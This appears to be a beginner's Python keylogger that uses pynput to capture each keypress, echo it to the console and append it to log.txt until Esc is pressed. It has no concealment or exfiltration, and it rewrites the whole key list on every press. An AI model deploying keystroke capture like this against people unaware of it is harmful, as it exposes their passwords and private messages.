import keyboard
from pynput.keyboard import Key, Listener

#GLOBAL VARIABLES
message = ''
count = 0
keys = []

def get_keypress(key):
    global keys, count
    print(f"You pressed the {key} key.")
    keys.append(key)
    count += 1

    write(keys)

def get_keyrelease(key):
    if key == Key.esc:
        return False


def write(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

with Listener(on_press=get_keypress, on_release=get_keyrelease) as listener:
    listener.join()
